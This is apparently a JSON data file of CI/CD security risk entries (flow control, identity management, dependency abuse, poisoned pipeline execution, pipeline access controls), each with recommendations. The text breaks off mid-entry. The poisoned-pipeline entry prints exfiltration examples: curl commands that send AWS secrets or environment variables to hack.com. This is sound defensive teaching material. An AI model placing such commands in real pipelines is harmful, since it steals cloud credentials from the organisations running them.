[
    {
        "tags":
        [
            "CICD-SEC-1: Insufficient Flow Control Mechanisms"
        ],
        "testcase": "Insufficient Flow Control Mechanisms",
        "details": "<h2>Definition</h2><p>Insufficient flow control mechanisms refer to the ability of an attacker that has obtained permissions to a system within the CI/CD process (SCM, CI, Artifact repository, etc.) to single handedly push malicious code or artifacts down the pipeline, due to a lack in mechanisms that enforce additional approval or review.</p><h2></h2><h2>Description</h2><p>CI/CD flows are designed for speed. New code can be created on a developer’s machine and get to production within minutes, often with full reliance on automation and minimal human involvement. Seeing that CI/CD processes are essentially the highway to the highly gated and secured production environments, organizations continuously introduce measures and controls aimed at ensuring that no single entity (human or application) can push code or artifacts through the pipeline without being required to undergo a strict set of reviews and approvals.</p><h2></h2><h2>Impact</h2><p>An attacker with access to the SCM, CI, or systems further down the pipeline, can abuse insufficient flow control mechanisms to deploy malicious artifacts. Once created, the artifacts are shipped through the pipeline - potentially all the way to production - without any approval or review. For example, an adversary may:</p><ul><li>Push code to a repository branch, which is automatically deployed through the pipeline to production.</li><li>Push code to a repository branch, and then manually trigger a pipeline that ships the code to production.</li><li>Directly push code to a utility library, which is used by code running in a production system.</li><li>Abuse an auto-merge rule in the CI that automatically merges pull requests that meet a predefined set of requirements, thus pushing malicious unreviewed code.</li><li>Abuse insufficient branch protection rules—for example, excluding specific users or branches to bypass branch protection and push malicious unreviewed code.</li><li>Upload an artifact to an artifact repository, such as a package or container, in the guise of a legitimate artifact created by the build environment. In such a scenario, a lack of controls or verifications could result in the artifact being picked up by a deploy pipeline and deployed to production.</li><li>Access production and directly change application code or infrastructure (e.g AWS Lambda function), without any additional approval/verification.</li></ul><h2></h2><h2>Recommendations</h2><p>Establish pipeline flow control mechanisms to ensure that no single entity (human / programmatic) is able to ship sensitive code and artifacts through the pipeline without external verification or validation. This can be achieved by implementing the following measures:</p><ul><li>Configure branch protection rules on branches hosting code which is used in production and other sensitive systems. Where possible, avoid exclusion of user accounts or branches from branch protection rules. Where user accounts are granted permission to push unreviewed code to a repository, ensure those accounts do not have the permission to trigger the deployment pipelines connected to the repository in question.</li><li>Limit the usage of auto-merge rules and ensure that wherever they are in use - they are applicable to the minimal amount of contexts. Review the code of all auto-merge rules thoroughly to ensure they cannot be bypassed and avoid importing 3rd party code in the auto-merge process.</li><li>Where applicable, prevent accounts from triggering production build and deployment pipelines without additional approval or review.</li><li>Prefer allowing artifacts to flow through the pipeline only in the condition that they were created by a pre-approved CI service account. Prevent artifacts that have been uploaded by other accounts from flowing through the pipeline without secondary review and approval.</li><li>Detect and prevent drifts and inconsistencies between code running in production and its CI/CD origin, and modify any resource that contains a drift.</li></ul><h2></h2><h2>References</h2><ol><li>Backdoor planted in the PHP git repository. The attackers pushed malicious unreviewed code directly to the PHP main branch, ultimately resulting in a formal PHP version being spread to all PHP websites.</li><li><a href=\"https://news-web.php.net/php.internals/113981\" rel=\"noopener noreferrer\" target=\"_blank\">https://news-web.php.net/php.internals/113981</a></li><li>Bypassing auto-merge rules in Homebrew, by <a href=\"https://twitter.com/ryotkak\" rel=\"noopener noreferrer\" target=\"_blank\">RyotaK</a>. An auto-merge rule used to merge insignificant changes into the main branch was susceptible to bypass, allowing adversaries to merge malicious code into the project.</li><li><a href=\"https://brew.sh/2021/04/21/security-incident-disclosure/\" rel=\"noopener noreferrer\" target=\"_blank\">https://brew.sh/2021/04/21/security-incident-disclosure/</a></li><li>Bypassing required reviews using GitHub Actions, by <a href=\"https://twitter.com/omer_gil\" rel=\"noopener noreferrer\" target=\"_blank\">Omer Gil</a>. The flaw allowed leveraging GitHub Actions to bypass the required reviews mechanism and push unreviewed code to a protected branch.</li><li><a href=\"https://www.cidersecurity.io/blog/research/bypassing-required-reviews-using-github-actions/\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.cidersecurity.io/blog/research/bypassing-required-reviews-using-github-actions/</a></li></ol>",
        "code": "CICD-SEC-1",
        "sort_order": 1
    },
    {
        "tags":
        [
            "CICD-SEC-2: Inadequate Identity and Access Management"
        ],
        "testcase": "Inadequate Identity and Access Management",
        "details": "<h2>Definition</h2><p>Inadequate Identity and Access Management risks stem from the difficulties in managing the vast amount of identities spread across the different systems in the engineering ecosystem, from source control to deployment. The existence of poorly managed identities - both human and programmatic accounts - increases the potential and the extent of damage of their compromise.</p><h2></h2><h2>Description</h2><p>Software delivery processes consist of multiple systems connected together with the aim of moving code and artifacts from development to production. Each system provides multiple methods of access and integration (username &amp; password, personal access token, marketplace application, oauth applications, plugins, SSH keys). The different types of accounts and method of access can potentially have their own unique provisioning method, set of security policies and authorization model. This complexity creates challenges in managing the different identities throughout the entire identity lifecycle and ensuring their permissions are aligned with the principle of least privilege.</p><p>Furthermore, in a typical environment, the average user account of an SCM or CI is highly permissive, as these systems have not traditionally been a major focus area for security teams. These identities are mostly used by engineers that require the flexibility to be able to create major changes in code and infrastructure.</p><p>Some of the major concerns and challenges around identity and access management within the CI/CD ecosystem include:</p><ul><li><strong>Overly permissive identities</strong> - Maintaining the principle of least privilege for both application and human accounts. For example, in SCMs - Ensuring each human and application identity has been granted only the permissions required and only against the actual repositories it needs to access is not trivial.</li><li><strong>Stale identities</strong> - Employees/Systems that are not active and/or no longer require access but have not had their human and programmatic account against all CI/CD systems deprovisioned.</li><li><strong>Local identities</strong> - Systems which do not have their access federated with a centralized IDP, creating identities that are managed locally within the system in question. Local accounts create challenges in enforcing consistent security policies (e.g. password policy, lockout policy, MFA) as well as properly deprovisioning access across all systems (for example, when an employee leaves the organization).</li><li><strong>External identities</strong> -<ul><li>Employees registered with an email address from a domain not owned or managed by the organization - In this scenario, the security of these accounts is highly dependent on the security of the external accounts they are assigned to. Since these accounts are not managed by the organization, they are not necessarily compliant with the organization’s security policy.</li><li>External collaborators - Once access is granted to external collaborators to a system, the security level of the system is derived from the level of the external collaborator’s work environment, outside of the organization’s control.</li></ul></li><li><strong>Self-registered identities</strong> - In systems where self-registration is allowed, it is often the case that a valid domain address is the only prerequisite for self-registration and access to CI/CD systems. Usage of default/base set of permissions to a system which is anything different than “none” significantly expands the potential attack surface.</li><li><strong>Shared identities</strong> - Identities shared between human users / applications / both humans and applications increase the footprint of their credentials as well as create challenges having to do with accountability in case of a potential investigation.</li></ul><h2></h2><h2>Impact</h2><p>The existence of hundreds (or sometimes thousands) of identities - both human and programmatic - across the CI/CD ecosystem, paired with a lack of strong identity and access management practices and common usage of overly permissive accounts, leads to a state where compromising nearly any user account on any system, could grant powerful capabilities to the environment, and could serve as a segue into the production environment.</p><h2></h2><h2>Recommendations</h2><ul><li>Conduct a continuous analysis and mapping of all identities across all systems within the engineering ecosystem. For each identity, map the identity provider, level of permissions granted and level of permissions actually used. Ensure all methods of programmatic access are covered within the analysis.</li><li>Remove permissions not necessary for the ongoing work of each identity across the different systems in the environment.</li><li>Determine an acceptable period for disabling/removing stale accounts and disable/remove any identity which has surpassed the predetermined period of inactivity.</li><li>Avoid creating local user accounts. Instead, create and manage identities using a centralized organization component (IdP). Whenever local user accounts are in use, ensure that accounts which no longer require access are disabled/removed and that security policies around all existing accounts match the organization’s policies.</li><li>Continuously map all external collaborators and ensure their identities are aligned with the principle of least privilege. Whenever possible, grant permissions with a predetermined expiry date - for both human and programmatic accounts - and disable their account once the work is done.</li><li>Prevent employees from using their personal email addresses, or any address which belongs to a domain not owned and managed by the organization, against the SCM, CI, or any other CI/CD platform. Continuously monitor for non-domain addresses across the different systems and remove non-compliant users.</li><li>Refrain from allowing users to self-register to systems, and grant permission on an as-needed basis.</li><li>Refrain from granting base permissions in a system to all users, and to large groups where user accounts are automatically assigned to.</li><li>Avoid using shared accounts. Create dedicated accounts for each specific context, and grant the exact set of permissions required for the context in question.</li></ul><h2></h2><h2>References</h2><ol><li>The Stack Overflow TeamCity build server compromise - The attacker was able to escalate their privileges in the environment due to the fact the newly registered accounts were assigned administrative privileges upon access to the system.</li><li><a href=\"https://stackoverflow.blog/2021/01/25/a-deeper-dive-into-our-may-2019-security-incident/\" rel=\"noopener noreferrer\" target=\"_blank\">https://stackoverflow.blog/2021/01/25/a-deeper-dive-into-our-may-2019-security-incident/</a></li><li>Mercedes Benz source code leaked after a self-maintained internet-facing GitLab server was available for access by self-registration.</li><li><a href=\"https://www.zdnet.com/article/mercedes-benz-onboard-logic-unit-olu-source-code-leaks-online/\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.zdnet.com/article/mercedes-benz-onboard-logic-unit-olu-source-code-leaks-online/</a></li><li>A self-managed GitLab server of the New York state government was exposed to the internet, allowing anyone to self-register and log in to the system, which stored sensitive secrets.</li><li><a href=\"https://techcrunch.com/2021/06/24/an-internal-code-repo-used-by-new-york-states-it-office-was-exposed-online/\" rel=\"noopener noreferrer\" target=\"_blank\">https://techcrunch.com/2021/06/24/an-internal-code-repo-used-by-new-york-states-it-office-was-exposed-online/</a></li><li>Malware added to the Gentoo Linux distribution source code, after the GitHub account password of a project maintainer was compromised.</li><li><a href=\"https://wiki.gentoo.org/wiki/Project:Infrastructure/Incident_Reports/2018-06-28_Github\" rel=\"noopener noreferrer\" target=\"_blank\">https://wiki.gentoo.org/wiki/Project:Infrastructure/Incident_Reports/2018-06-28_Github</a></li></ol>",
        "code": "CICD-SEC-2",
        "sort_order": 2
    },
    {
        "tags":
        [
            "CICD-SEC-3: Dependency Chain Abuse"
        ],
        "testcase": "Dependency Chain Abuse",
        "details": "<h2>Definition</h2><p>Dependency chain abuse risks refer to an attacker’s ability to abuse flaws relating to how engineering workstations and build environments fetch code dependencies. Dependency chain abuse results in a malicious package inadvertently being fetched and executed locally when pulled.</p><h2></h2><h2>Description</h2><p>Managing dependencies and external packages used by self written code is becoming increasingly complex given the total number of systems involved in the process across all development contexts in an organization. Packages are oftentimes fetched using a dedicated client per programming language, typically from a combination of self-managed package repositories (e.g. Jfrog Artifactory) and language specific SaaS repositories (for example - Node.js has npm and the npm registry, Python’s pip uses PyPI, and Ruby’s gems uses RubyGems).</p><p>Many organizations go to great lengths to detect usage of packages with known vulnerabilities and conduct static analysis of both self-written and 3rd party code. However, in the context of using dependencies, there is an equally important set of controls required to secure the dependency ecosystem - involving securing the process defining how dependencies are pulled. Inadequate configurations may cause an unsuspecting engineer, or worse - the build system, to download a malicious package instead of the package that was intended to be pulled. In many cases, the package is not only downloaded, but also immediately executed after download, due to pre-install scripts and similar processes which are designed to run a package’s code immediately after the package is pulled.</p><p>The main attack vectors in this context are:</p><ul><li>Dependency confusion - Publication of malicious packages in public repositories with the same name as internal package names, in an attempt to trick clients into downloading the malicious package rather than the private one.</li><li>Dependency hijacking - Obtaining control of the account of a package maintainer on the public repository, in order to upload a new, malicious version of a widely used package, with the intent of compromising unsuspecting clients who pull the latest version of the package.</li><li>Typosquatting - Publication of malicious packages with similar names to those of popular packages in the hope that a developer will misspell a package name and unintentionally fetch the typosquatted package.</li><li>Brandjacking - Publication of malicious packages in a manner that is consistent with the naming convention or other characteristics of a specific brand’s package, in an attempt to get unsuspecting developers to fetch these packages due to falsely associating them with the trusted brand.</li></ul><h2></h2><h2>Impact</h2><p>The objective of adversaries which upload packages to public package repositories using one of the aforementioned techniques is to execute malicious code on a host pulling the package. This could either be a developer’s workstation, or a build server pulling the package.</p><p>Once the malicious code is running, it can be leveraged for credentials theft and lateral movement within the environment it is executed in.</p><p>Another potential scenario is for the attacker’s malicious code to make its way to production environments from the build server. In many cases the malicious package would continue to also maintain the original, safe functionality the user was expecting, resulting in a lower probability of discovery.</p><h2></h2><h2>Recommendations</h2><p>There is a wide range of mitigation methods which are specific to the configuration of the different language-specific clients and the way internal proxies and external package repositories are used.</p><p>That said, all recommended controls share the same guiding principles -</p><ul><li>Any client pulling code packages should not be allowed to fetch packages directly from the internet or untrusted sources. Instead, the following controls should be implemented:<ul><li>Whenever 3rd party packages are pulled from an external repository, ensure all packages are pulled through an internal proxy rather than directly from the internet. This allows deploying additional security controls at the proxy layer, as well as providing investigative capabilities around packages pulled - in case of a security incident.</li><li>Where applicable, disallow pulling of packages directly from external repositories. Configure all clients to pull packages from internal repositories, containing pre-vetted packages, and establish a mechanism to verify and enforce this client configuration.</li></ul></li><li>Enable checksum verification and signature verification for pulled packages.</li><li>Avoid configuring clients to pull the latest version of a package. Prefer configuring a pre-vetted version or version ranges. Use the framework specific techniques to continuously “lock” the package version required in your organization to a stable and secure version.</li><li>Scopes:<ul><li>Ensure all private packages are registered under the organization’s scope.</li><li>Ensure all code referencing a private package uses the package’s scope.</li><li>Ensure clients are forced to fetch packages that are under your organization’s scope solely from your internal registry.</li></ul></li><li>When installation scripts are being executed as part of the package installation, ensure that a separate context exists for those scripts, which does not have access to secrets and other sensitive resources available in other stages in the build process.</li><li>Ensure that internal projects always contain configuration files of package managers (for example .npmrc in NPM) within the code repository of the project, to override any insecure configuration potentially existing on a client fetching the package.</li><li>Avoid publishing names of internal projects in public repositories.</li><li>As a general rule, given the amount of package managers and configurations in use simultaneously, complete prevention of 3rd party chain abuse is far from trivial. It is therefore recommended to ensure that an appropriate level of focus is placed around detection, monitoring and mitigation to ensure that in case of an incident, it is identified as quickly as possible and has the minimal amount of potential damage. In this context, all relevant systems should be hardened properly according to the guidelines under the “CICD-SEC-7: Insecure System Configuration” risk.</li></ul><h2></h2><h2>References</h2><ol><li>Dependency Confusion, by <a href=\"https://twitter.com/alxbrsn\" rel=\"noopener noreferrer\" target=\"_blank\">Alex Birsan</a>. An attack vector that tricks package managers and proxies into fetching a malicious package from a public repository instead of the intended package of the same name from an internal repository.</li><li><a href=\"https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610\" rel=\"noopener noreferrer\" target=\"_blank\">https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610</a></li><li>Amazon, Zillow, Lyft, and Slack NodeJS apps targeted by threat actors using the Dependency Confusion vulnerability.</li><li><a href=\"https://www.bleepingcomputer.com/news/security/malicious-npm-packages-target-amazon-slack-with-new-dependency-attacks/\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.bleepingcomputer.com/news/security/malicious-npm-packages-target-amazon-slack-with-new-dependency-attacks/</a></li><li>The <em>ua-parser-js</em> NPM library, with 9 million downloads a week, was hijacked to launch cryptominers and steal credentials.</li><li><a href=\"https://github.com/advisories/GHSA-pjwm-rvh2-c87w\" rel=\"noopener noreferrer\" target=\"_blank\">https://github.com/advisories/GHSA-pjwm-rvh2-c87w</a></li><li>The <em>coa</em> NPM library, with 9 million downloads a week, was hijacked to steal credentials.</li><li><a href=\"https://github.com/advisories/GHSA-73qr-pfmq-6rp8\" rel=\"noopener noreferrer\" target=\"_blank\">https://github.com/advisories/GHSA-73qr-pfmq-6rp8</a></li><li>The <em>rc</em> NPM library, with 14 million downloads a week, was hijacked to steal credentials.</li><li><a href=\"https://github.com/advisories/GHSA-g2q5-5433-rhrf\" rel=\"noopener noreferrer\" target=\"_blank\">https://github.com/advisories/GHSA-g2q5-5433-rhrf</a></li></ol>",
        "code": "CICD-SEC-3",
        "sort_order": 3
    },
    {
        "tags":
        [
            "CICD-SEC-4: Poisoned Pipeline Execution (PPE)"
        ],
        "testcase": "Poisoned Pipeline Execution (PPE)",
        "details": "<h2>Definition</h2><p>Poisoned Pipeline Execution (PPE) risks refer to the ability of an attacker with access to source control systems - and without access to the build environment, to manipulate the build process by injecting malicious code/commands into the build pipeline configuration, essentially ‘poisoning’ the pipeline and running malicious code as part of the build process.</p><h2></h2><h2>Description</h2><p>The PPE vector abuses permissions against an SCM repository, in a way that causes a CI pipeline to execute malicious commands.</p><p>Users that have permissions to manipulate the CI configuration files, or other files which the CI pipeline job relies on, can modify them to contain malicious commands, ultimately “poisoning” the CI pipeline executing these commands.</p><p>Pipelines executing unreviewed code, for example those which are triggered directly off of pull requests or commits to arbitrary repository branches, are more susceptible to PPE. The reason is that these scenarios, by design, contain code which has not undergone any reviews or approvals.</p><p>Once able to execute malicious code within the CI pipeline, the attacker can conduct a wide array of malicious operations, all within the context of the pipeline’s identity.</p><p>There are three types of PPE:</p><p><strong>Direct PPE (D-PPE):</strong> In a D-PPE scenario, the attacker modifies the CI config file in a repository they have access to, either by pushing the change directly to an unprotected remote branch on the repo, or by submitting a PR with the change from a branch or a fork. Since the CI pipeline execution is triggered off of the “push” or ”PR” events, and the pipeline execution is defined by the commands in the modified CI configuration file, the attacker’s malicious commands ultimately run in the build node once the build pipeline is triggered.</p><p><strong>Indirect PPE (I-PPE):</strong> In certain cases, the possibility of D-PPE is not available to an adversary with access to an SCM repository:</p><ul><li>If the pipeline is configured to pull the CI configuration file from a separate, protected branch in the same repository.</li><li>If the CI configuration file is stored in a separate repository from the source code, without the option for a user to directly edit it.</li><li>If the CI build is defined in the CI system itself - instead of in a file stored in the source code.</li></ul><p>In such a scenario, the attacker can still poison the pipeline by injecting malicious code into files referenced by the pipeline configuration file, for example:</p><ul><li><em>make</em>: Executes commands defined in the “Makefile” file.</li><li>Scripts referenced from within the pipeline configuration file, which are stored in the same repository as the source code itself (e.g. <em>python myscript.py</em> - where myscript.py would be manipulated by the attacker).</li><li>Code tests: Testing frameworks running on application code within the build process rely on dedicated files, stored in the same repository as the source code itself. Attackers that are able to manipulate the code responsible for testing are then able to run malicious commands inside the build.</li><li>Automatic tools: Linters and security scanners used in the CI, are also commonly reliant on a configuration file residing in the repository. Many times these configurations involve loading and running external code from a location defined inside the configuration file.</li></ul><p>So rather than poisoning the pipeline by inserting malicious commands directly into the pipeline definition file, In I-PPE, an attacker injects malicious code into files referenced by the configuration file. The malicious code is ultimately executed on the pipeline node once the pipeline is triggered and runs the commands declared in the files in question.</p><p><strong>Public-PPE (3PE):</strong> Execution of a PPE attack requires access to the repository hosting the pipeline configuration file, or to files it references. In most cases, the permission to do so would be given to organization members - mainly engineers. Therefore, attackers would typically have to be in possession of an engineer’s permission to the repository to execute a direct or indirect PPE attack.</p><p>However, in some cases poisoning CI pipelines is available to anonymous attackers on the internet: Public repositories (for example open source projects) oftentimes allow any user to contribute - usually by creating pull requests, suggesting changes to the code. These projects are commonly automatically tested and built using a CI solution, in a similar fashion to private projects.</p><p>If the CI pipeline of a public repository runs unreviewed code suggested by anonymous users, it is susceptible to a Public PPE attack, or in short - 3PE. This also exposes internal assets, such as secrets of private projects, in cases where the pipeline of the vulnerable public repository runs on the same CI instance as private ones.</p><p><strong>Examples</strong></p><p>Example 1: Credential theft via Direct-PPE (GitHub Actions)</p><p>In the following example, a GitHub repository is connected with a GitHub Actions workflow that fetches the code, builds it, runs tests, and eventually deploys artifacts to AWS.</p><p>When new code is pushed to a remote branch in the repository, the code - including the pipeline configuration file - is fetched by the runner (the workflow node).</p><pre>name: PIPELINE\non: push\njobs:\n build:\n   runs-on: ubuntu-latest\n   steps:\n     - run: |\n         echo \"building...\"\n         echo \"testing...\"\n         echo \"deploying...\"\n</pre><p>In this scenario, a D-PPE attack would be carried out as follows:</p><ol><li>An attacker creates a new remote branch in the repository, in which they update the pipeline configuration file with malicious commands intended to access AWS credentials scoped to the GitHub organization and then to send them to a remote server.</li></ol><pre>name: PIPELINE\non: push\njobs:\n build:\n   runs-on: ubuntu-latest\n   steps:\n     - env:\n         ACCESS_KEY: $\n         SECRET_KEY: $\n\n       run: |\n         curl -d creds=\"$(echo $ACCESS_KEY:$SECRET_KEY | base64 | base64)\" hack.com\n\n</pre><ol><li>Once the update is pushed, this triggers a pipeline which fetches the code from the repository, including the malicious pipeline configuration file.</li><li>The pipeline runs based on the configuration file “poisoned” by the attacker. As per the attacker’s malicious commands, AWS credentials stored as repository secrets are loaded into memory.</li><li>The pipeline proceeds to execute the attacker’s commands which send the AWS credentials to a server controlled by the attacker.</li><li>The attacker is then able to use the stolen credentials to access the AWS production environment.</li></ol><p>Example 2: Credential theft via Indirect-PPE (Jenkins)</p><p>This time, it is a Jenkins pipeline that fetches code from the repository, builds it, runs tests, and eventually deploys to AWS. In this scenario the pipeline configuration is such that the file describing the pipeline - the Jenkinsfile - is always fetched from the main branch in the repository, which is protected. Therefore, the attacker cannot manipulate the build definition, meaning that fetching secrets stored on the Jenkins credential store, or running the job on other nodes are not a possibility.</p><p>However - this does not mean that the pipeline is risk free;</p><p>In the <em>build</em> stage of the pipeline, AWS credentials are loaded as environment variables, making them available only to the commands running in this stage. In the example below, the <em>make</em> command, which is based on the contents of Makefile (also stored in the repository), runs as part of this stage.</p><p>The Jenkinsfile:</p><pre>pipeline {\n   agent any\n   stages {\n       stage('build') {\n           steps {\n               withAWS(credentials: 'AWS_key', region: 'us-east-1') {\n                       sh 'make build'\n                       sh 'make clean'\n               }\n           }\n       }\n       stage('test') {\n           steps {\n               sh 'go test -v ./...'\n...\n</pre><p>The Makefile:</p><pre>build:\n   echo \"building…\"\n\nclean:\n   echo \"cleaning…\"\n</pre><p>In this scenario, an I-PPE attack would be carried out as follows:</p><ol><li>An attacker creates a pull request in the repository, appending malicious commands to the <em>Makefile</em> file.</li></ol><pre>build:\n   curl -d \"$$(env)\" hack.com\n\nclean:\n   echo \"cleaning…\"\n\n</pre><ol><li>Since the pipeline is configured to be triggered upon any PR against the repo, the Jenkins pipeline is triggered, fetching the code from the repository, including the malicious <em>Makefile</em>.</li><li>The pipeline runs based on the configuration file stored in the main branch. It gets to the <em>build</em> stage, and loads the AWS credentials into environment variables - as defined in the original Jenkinsfile. Then, it runs the <em>make build</em> command, which executes the malicious command that was added into <em>Makefile</em>.</li><li>The malicious <em>build</em> function defined in the Makefile is executed, sending the AWS credentials to a server controlled by the attacker.</li><li>The attacker is then able to use the stolen credentials to access the AWS production environment.</li></ol><h2></h2><h2>Impact</h2><p>In a successful PPE attack, attackers execute malicious unreviewed code in the CI. This provides the attacker with the same abilities and level of access as the build job, including:</p><ul><li>Access to any secret available to the CI job, such as secrets injected as environment variables or additional secrets stored in the CI. Being responsible for building code and deploying artifacts, CI/CD systems typically contain dozens of high-value credentials and tokens - such as to a cloud provider, to artifact registries, and to the SCM itself.</li><li>Access to external assets the job node has permissions to, such as files stored in the node’s file system, or credentials to a cloud environment accessible through the underlying host.</li><li>Ability to ship code and artifacts further down the pipeline, in the guise of legitimate code built by the build process.</li><li>Ability to access additional hosts and assets in the network/environment of the job node.</li></ul><h2></h2><h2>Recommendations</h2><p>Preventing and mitigating the PPE attack vector involves multiple measures spanning across both SCM and CI systems:</p><ul><li>Ensure that pipelines running unreviewed code are executed on isolated nodes, not exposed to secrets and sensitive environments.</li><li>Evaluate the need for triggering pipelines on public repositories from external contributors. Where possible, refrain from running pipelines originating from forks, and consider adding controls such as requiring manual approval for pipeline execution.</li><li>For sensitive pipelines, for example those that are exposed to secrets, ensure that each branch that is configured to trigger a pipeline in the CI system has a correlating branch protection rule in the SCM.</li><li>To prevent the manipulation of the CI configuration file to run malicious code in the pipeline, each CI configuration file must be reviewed before the pipeline runs. Alternatively, the CI configuration file can be managed in a remote branch, separate from the branch containing the code being built in the pipeline. The remote branch should be configured as protected.</li><li>Remove permissions granted on the SCM repository from users that do not need them.</li><li>Each pipeline should only have access to the credentials it needs to fulfill its purpose. The credentials should have the minimum required privileges.</li></ul><h2></h2><h2>References</h2><ol><li>Exploiting Continuous Integration and Automated Build systems, DEF CON 25, by Tyler Welton. The talk covered exploitation techniques of the Direct-PPE and 3PE attack vectors, targeting pipelines running unreviewed code.</li><li><a href=\"https://www.youtube.com/watch?v=mpUDqo7tIk8\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.youtube.com/watch?v=mpUDqo7tIk8</a></li><li>PPE - Poisoned Pipeline Execution. Running malicious code in your CI, without access to your CI. By <a href=\"https://twitter.com/Dkrivelev\" rel=\"noopener noreferrer\" target=\"_blank\">Daniel Krivelevich</a> and <a href=\"https://twitter.com/omer_gil\" rel=\"noopener noreferrer\" target=\"_blank\">Omer Gil</a>.</li><li><a href=\"https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/</a></li><li>Build Pipeline Security, by <a href=\"https://twitter.com/xssfox\" rel=\"noopener noreferrer\" target=\"_blank\">xssfox</a>. An Indirect-PPE vulnerability was exposed in the CodeBuild pipeline of a website belonging to AWS. This allowed anonymous attackers to modify a script executed by the build configuration file with the creation of a pull request, resulting in the compromise of deployment credentials.</li><li><a href=\"https://sprocketfox.io/xssfox/2021/02/18/pipeline/\" rel=\"noopener noreferrer\" target=\"_blank\">https://sprocketfox.io/xssfox/2021/02/18/pipeline/</a></li><li>GitHub Actions abused to mine cryptocurrency by pull requests that contained malicious code.</li><li><a href=\"https://dev.to/thibaultduponchelle/the-github-action-mining-attack-through-pull-request-2lmc\" rel=\"noopener noreferrer\" target=\"_blank\">https://dev.to/thibaultduponchelle/the-github-action-mining-attack-through-pull-request-2lmc</a></li><li>A terraform provider for execution of OS commands during run of <em>terraform plan</em> in the pipeline, by <a href=\"https://twitter.com/rung\" rel=\"noopener noreferrer\" target=\"_blank\">Hiroki Suezawa</a>.</li><li><a href=\"https://github.com/rung/terraform-provider-cmdexec\" rel=\"noopener noreferrer\" target=\"_blank\">https://github.com/rung/terraform-provider-cmdexec</a></li><li>Abusing the <em>terraform plan</em> command for execution of OS commands in the CI/CD, by <a href=\"https://twitter.com/alxk7i\" rel=\"noopener noreferrer\" target=\"_blank\">Alex Kaskasoli</a>.</li><li><a href=\"https://alex.kaskaso.li/post/terraform-plan-rce\" rel=\"noopener noreferrer\" target=\"_blank\">https://alex.kaskaso.li/post/terraform-plan-rce</a></li><li>A vulnerability found in Teleport’s CI implementation, that allowed attackers from the internet to execute a Direct-3PE attack by creating a pull request in a public GitHub repository linked with a Drone CI pipeline, and modifying the CI configuration file to execute a malicious pipeline.</li><li><a href=\"https://goteleport.com/blog/hack-via-pull-request/\" rel=\"noopener noreferrer\" target=\"_blank\">https://goteleport.com/blog/hack-via-pull-request/</a></li><li>Research by Asier Rivera Fernandez showed how a PPE attack against a CI/CD environment including CodePipeline, CodeBuild and CodeDeploy services in AWS could be executed.</li><li><a href=\"https://www.youtube.com/watch?v=McZBcMRxPTA\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.youtube.com/watch?v=McZBcMRxPTA</a> <a href=\"https://www.pwc.be/en/FY21/documents/AWS%20CI_CD%20technical%20article%20-%20v3.pdf\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.pwc.be/en/FY21/documents/AWS%20CI_CD%20technical%20article%20-%20v3.pdf</a></li></ol>",
        "code": "CICD-SEC-4",
        "sort_order": 4
    },
    {
        "tags":
        [
            "CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)"
        ],
        "testcase": "Insufficient PBAC (Pipeline-Based Access Controls)",
        "details": "<h2>Definition</h2><p>Pipeline execution nodes have access to numerous resources and systems within and outside the execution environment. When running malicious code within a pipeline, adversaries leverage insufficient PBAC (Pipeline-Based Access Controls) risks to abuse the permission granted to the pipeline for moving laterally within or outside the CI/CD system.</p><h2></h2><h2>Description</h2><p>Pipelines are the beating heart of CI/CD. Nodes executing pipelines carry out the commands specified in the pipeline configuration and by doing so - conduct a wide array of sensitive activities:</p><ul><li>Access source code, build and test it.</li><li>Obtain secrets from various locations, such as environment variables, vaults, dedicated cloud-based identity services (such as the AWS metadata service), and other locations.</li><li>Create, modify and deploy artifacts.</li></ul><p>PBAC is a term which refers to the context in which each pipeline - and each step within that pipeline - is running. Given the highly sensitive and critical nature of each pipeline, it is imperative to limit each pipeline to the exact set of data and resources it needs access to. Ideally, each pipeline and step should be restricted in such a manner that will ensure that in case an adversary is able to to execute malicious code within the context of the pipeline, the extent of potential damage is minimal.</p><p>PBAC includes controls relating to numerous elements having to do with the pipeline execution environment:</p><ul><li>Access within the pipeline execution environment: to code, secrets, environment variables, and other pipelines.</li><li>Permissions to the underlying host and other pipeline nodes.</li><li>Ingress and egress filters to the internet.</li></ul><h2></h2><h2>Impact</h2><p>A piece of malicious code that is able to run in the context of the pipeline execution node has the full permissions of the pipeline stage it runs in. It can access secrets, access the underlying host and connect to any of the systems the pipeline in question has access to. This can lead to exposure of confidential data, lateral movement within the CI environment - potentially accessing servers and systems outside the CI environment, and deployment of malicious artifacts down the pipeline, including to production.</p><p>The extent of the potential damage of a scenario in which an adversary is able to compromise pipeline execution nodes or inject malicious code into the Build process is determined by the granularity of the PBAC in the environment.</p><h2></h2><h2>Recommendations</h2><ul><li>Do not use a shared node for pipelines with different levels of sensitivity / that require access to different resources. Shared nodes should be used only for pipelines with identical levels of confidentiality.</li><li>Ensure secrets that are used in CI/CD systems are scoped in a manner that allows each pipeline and step to have access to only the secrets it requires.</li><li>Revert the execution node to its pristine state after each pipeline execution.</li><li>Ensure the OS user running the pipeline job has been granted OS permissions on the execution node according to the principle of least privilege.</li><li>CI and CD pipeline jobs should have limited permissions on the controller node. Where applicable, run pipeline jobs on a separate, dedicated node.</li><li>Ensure the execution node is appropriately patched.</li><li>Ensure network segmentation in the environment the job is running on is configured to allow the execution node to access only the resources it requires within the network. Where possible, refrain from granting unlimited access towards the internet to build nodes.</li><li>When installation scripts are being executed as part of the package installation, ensure that a separate context exists for those scripts, which does not have access to secrets and other sensitive resources available in other stages in the build process.</li></ul><h2></h2><h2>References</h2><ol><li>Codecov, a popular code coverage tool used in the CI, was compromised and used to steal environment variables from builds.</li><li><a href=\"https://about.codecov.io/security-update/\" rel=\"noopener noreferrer\" target=\"_blank\">https://about.codecov.io/security-update/</a></li><li>Amazon, Zillow, Lyft, and Slack NodeJS apps targeted by threat actors using the Dependency Confusion vulnerability. Organizations that were victims of Dependency Confusion attacks had malicious code executed on CI nodes, allowing the adversary to move laterally within the environment and abuse insufficient PBAC.</li><li><a 